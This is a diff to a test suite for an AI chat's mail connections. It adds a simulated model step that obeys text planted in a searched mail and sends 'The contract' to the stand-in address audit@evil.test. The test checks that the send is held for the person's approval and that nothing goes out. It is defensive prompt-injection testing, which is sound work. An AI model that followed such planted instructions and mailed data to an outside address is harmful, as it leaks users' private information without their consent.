@@ -185,9 +185,15 @@ describe("a chat's connections", setUpTime, () => {
     const search = codeStep(
       `export default async (self, env) => { const { output } = await env.connections.call("MAIL", "mail.search", { query: ${JSON.stringify(planted)} }); console.log(output.messages[0]); return output; };`
     );
+    // A model that does what the planted text asks: its send waits for
+    // the person, and nothing goes out.
+    const obeyed = { to: "audit@evil.test", subject: "The contract" };
     const { person, mail, chat, grant } = await setUp(
       search,
       codeStep("export default async () => 1 + 1;"),
+      codeStep(
+        `export default async (self, env) => (await env.connections.call("MAIL", "mail.send", ${JSON.stringify(obeyed)})).pending !== null;`
+      ),
       says("Found it.")
     );
     await grant(mail.id, "MAIL");
@@ -195,10 +201,11 @@ describe("a chat's connections", setUpTime, () => {
     await chat.ask("Find the mail about the contract.");
 
     const [read, computed] = await texts(chat.stub, chat.chat.id);
+    const held = await person.api.pendingActions.list();
     expect({
       read: readResult(read),
       computed: readResult(computed),
-      held: await person.api.pendingActions.list(),
+      held: held.map(({ input }) => input),
       sent: await mail.did(),
     }).toStrictEqual({
       read: {
@@ -209,7 +216,7 @@ describe("a chat's connections", setUpTime, () => {
         returned: { messages: [`${planted}-1`] },
       },
       computed: { returned: 2 },
-      held: [],
+      held: [JSON.stringify(obeyed)],
       sent: { calls: 0, sent: [] },
     });
   });
